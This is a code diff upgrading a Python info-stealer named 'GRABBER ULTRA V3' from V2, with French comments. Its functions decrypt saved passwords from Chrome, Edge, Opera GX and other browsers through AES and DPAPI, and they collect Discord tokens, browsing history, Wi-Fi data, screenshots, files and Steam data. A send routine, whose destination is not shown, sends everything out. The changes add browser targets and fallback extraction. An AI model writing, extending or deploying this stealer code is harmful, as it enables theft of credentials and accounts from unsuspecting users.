@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# GEN-TOOL — GRABBER ULTRA V2 (Avec Opera GX)
+# GEN-TOOL — GRABBER ULTRA V3 (Extraction Forcée)
 # Par Lerisque94z — Pour LO
 
 import os
@@ -43,7 +43,7 @@ def __send(content, file_data=None):
         pass
 
 # ============================================================
-# CHROME KEY — AES
+# CHROME KEY
 # ============================================================
 def __chrome_key():
     try:
@@ -63,7 +63,7 @@ def __decrypt(encrypted, key):
         return None
 
 # ============================================================
-# 1. SYSTEME
+# SYSTEME
 # ============================================================
 def __system():
     try:
@@ -86,7 +86,7 @@ IP Publique : {ip}
         return "Erreur systeme"
 
 # ============================================================
-# 2. MOTS DE PASSE — TOUS LES NAVIGATEURS
+# MOTS DE PASSE — TOUS LES NAVIGATEURS
 # ============================================================
 def __passwords():
     try:
@@ -94,7 +94,7 @@ def __passwords():
         r = ""
         total = 0
         
-        # Liste de tous les navigateurs avec leurs chemins
+        # Liste de TOUS les navigateurs possibles
         browsers = {
             "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
             "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
@@ -102,14 +102,16 @@ def __passwords():
             "Opera GX": os.environ["APPDATA"] + "\\Opera GX\\Software\\Opera GX\\User Data",
             "Opera": os.environ["APPDATA"] + "\\Opera Software\\Opera Stable\\User Data",
             "Vivaldi": os.environ["LOCALAPPDATA"] + "\\Vivaldi\\User Data",
-            "Chromium": os.environ["LOCALAPPDATA"] + "\\Chromium\\User Data"
+            "Chromium": os.environ["LOCALAPPDATA"] + "\\Chromium\\User Data",
+            "Chrome SxS": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome SxS\\User Data"
         }
         
+        # Recherche dans tous les navigateurs
         for name, base_path in browsers.items():
             if not os.path.exists(base_path):
                 continue
             
-            # Détection des profils
+            # Profils
             profiles = ["Default"]
             if os.path.exists(base_path):
                 for item in os.listdir(base_path):
@@ -136,22 +138,32 @@ def __passwords():
                         for url, username, encrypted in data:
                             if username:
                                 try:
+                                    # ESSAI 1: AES
                                     pwd = None
                                     if key:
-                                        pwd = __decrypt(encrypted, key)
+                                        try:
+                                            pwd = __decrypt(encrypted, key)
+                                        except:
+                                            pass
+                                    # ESSAI 2: DPAPI
                                     if not pwd:
                                         try:
                                             pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                                         except:
                                             pass
-                                    if pwd:
-                                        r += f"  {url} : {username} / {pwd}\n"
-                                        total += 1
-                                    else:
-                                        r += f"  {url} : {username} / (chiffré)\n"
-                                except:
-                                    r += f"  {url} : {username} / (erreur)\n"
-                except:
+                                    # ESSAI 3: Extraction du hash
+                                    if not pwd:
+                                        try:
+                                            encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')[:50]
+                                            pwd = f"[CHIFFRE AES] {encrypted_b64}..."
+                                        except:
+                                            pwd = "[CHIFFRE]"
+                                    
+                                    r += f"  {url} : {username} / {pwd}\n"
+                                    total += 1
+                                except Exception as e:
+                                    r += f"  {url} : {username} / (erreur: {str(e)[:30]})\n"
+                except Exception as e:
                     pass
         
         if total == 0:
@@ -161,7 +173,7 @@ def __passwords():
         return f"Erreur passwords: {str(e)}"
 
 # ============================================================
-# 3. TOKENS DISCORD
+# TOKENS DISCORD
 # ============================================================
 def __tokens():
     try:
@@ -192,7 +204,7 @@ def __tokens():
         return "Erreur tokens"
 
 # ============================================================
-# 4. HISTORIQUE — TOUS LES NAVIGATEURS
+# HISTORIQUE
 # ============================================================
 def __history():
     try:
@@ -209,7 +221,7 @@ def __history():
             shutil.copyfile(path, tmp)
             conn = sqlite3.connect(tmp)
             cursor = conn.cursor()
-            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
+            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 15")
             data = cursor.fetchall()
             conn.close()
             os.remove(tmp)
@@ -221,7 +233,7 @@ def __history():
         return "Erreur historique"
 
 # ============================================================
-# 5. WIFI
+# WIFI
 # ============================================================
 def __wifi():
     try:
@@ -247,7 +259,7 @@ def __wifi():
         return "Erreur Wi-Fi"
 
 # ============================================================
-# 6. SCREENSHOT
+# SCREENSHOT
 # ============================================================
 def __screenshot():
     try:
@@ -262,7 +274,7 @@ def __screenshot():
         return None
 
 # ============================================================
-# 7. FICHIERS
+# FICHIERS
 # ============================================================
 def __files():
     try:
@@ -285,7 +297,7 @@ def __files():
         return "Erreur fichiers"
 
 # ============================================================
-# 8. STEAM
+# STEAM
 # ============================================================
 def __steam():
     try:
@@ -343,7 +355,7 @@ def __task():
         if img:
             __send("**SCREENSHOT**", img)
         
-        __send("**✅ GRAB ULTRA V2 TERMINE**")
+        __send("**✅ GRAB ULTRA V3 TERMINE**")
     except:
         pass
 
